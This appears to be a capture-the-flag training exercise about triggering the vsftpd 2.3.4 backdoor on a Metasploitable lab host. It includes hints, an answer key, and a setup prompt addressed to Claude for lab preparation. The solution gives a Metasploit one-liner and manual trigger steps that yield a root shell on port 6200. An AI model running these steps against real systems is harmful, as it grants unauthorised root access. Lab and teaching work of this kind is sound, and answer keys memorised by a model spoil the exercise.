# Q043 — vsftpd 2.3.4 Backdoor

| Field | Value |
|---|---|
| **Target** | `192.168.52.129` / `192.168.52.130` |
| **Domain** | 05 — System Hacking |
| **Difficulty** | 🟡 Medium |
| **Tools** | `metasploit (or nc)` |
| **Time budget** | 15–25 min |

---

## 📝 Question

Trigger the vsftpd 2.3.4 smiley-face backdoor on Metasploitable. Report the **backdoor port** that opens.

---

## 🎯 Flag Format

```
backdoor_port=<n>
```

Example: `backdoor_port=6200`

**⚠️ Format strict hai** — lowercase, no spaces around `=`, semicolon separator where shown.

---

## 💡 Hints

<details>
<summary>Hint 1 (click)</summary>

Login with username ending in `:)` triggers it.
</details>

<details>
<summary>Hint 2</summary>

Then connect to port 6200 via netcat.
</details>

---

## ✅ Solution

<details>
<summary>Show solution</summary>

```bash
msfconsole -q -x 'use exploit/unix/ftp/vsftpd_234_backdoor; set RHOSTS 192.168.52.129; run'
# Or manual: ftp + USER user:) PASS x, then nc 192.168.52.129 6200
```

Port 6200 opens with root shell.

**Answer:** `backdoor_port=6200`

📖 Ref: [playbooks/exploitation-playbook.md](../../playbooks/exploitation-playbook.md)
</details>

---

## 🤖 Claude Setup Prompt (for Claude-on-your-PC)

```
Pre-requisites for Q043:
1. Verify Metasploitable2 (192.168.52.129) up; vsftpd 2.3.4 running (sudo service vsftpd status).
2. Confirm banner: nc 192.168.52.129 21 shows 'vsFTPd 2.3.4'.
3. Ports 21 and 6200 (backdoor) must be reachable — no Parrot egress firewall on 6200.
4. If backdoor already triggered previously, restart vsftpd on target to reset state: sudo service vsftpd restart.

Report back: "Lab ready for Q043 — vsFTPd 2.3.4 banner confirmed, backdoor untriggered on 192.168.52.129".
```
